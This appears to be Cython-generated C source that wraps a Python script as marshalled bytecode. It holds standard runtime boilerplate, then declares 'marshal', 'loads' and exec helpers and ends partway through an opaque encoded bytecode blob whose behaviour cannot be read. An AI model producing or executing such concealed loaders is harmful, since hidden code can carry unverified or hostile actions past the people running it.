  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* PyExecGlobals.proto */
static PyObject* __Pyx_PyExecGlobals(PyObject*);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_z_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d[] = "\343\000\000\000\000\000\000\000\000\000\000\000\000\007\000\000\000\000\000\000\000\363z\016\000\000\227\000d\000Z\000\t\000d\001d\002l\001Z\001d\001d\002l\002Z\002d\001d\002l\003Z\003d\001d\002l\004Z\004d\001d\002l\005Z\005d\001d\002l\006Z\006d\001d\002l\007Z\007d\001d\003l\010m\tZ\t\001\000d\001d\002l\nZ\nd\001d\004l\nm\013Z\014\001\000d\001d\005l\rm\016Z\016\001\000d\001d\002l\017Z\017d\001d\006l\020m\021Z\021m\022Z\022\001\000d\001d\007l\023m\024Z\024\001\000d\001d\010l\025m\026Z\026\001\000d\001d\tl\010m\027Z\027\001\000d\001d\002l\030Z\030d\001d\nl\031m\031Z\031\001\000d\001d\013l\005m\032Z\033m\034Z\035\001\000d\001d\014l\036m\037Z \001\000d\001d\002l!Z!d\236d\016\204\001Z\"g\000d\017\242\001Z#d\237d\021\204\001Z$\002\000e$d\020\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z%d\022Z&d\023Z'd\024Z(d\025\204\000Z)\002\000e\001j*\000\000\000\000\000\000\000\000d\026\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\nj+\000\000\000\000\000\000\000\000d\027\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z,\002\000e-e,j.\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/d\030\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\016d\031d\032d\033g\002d\034d\035\254\036\246\004\000\000\253\004\000\000\000\000\000\000\000\000Z0\002\000e\"e0\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e\"d\037\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e/e'\233\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000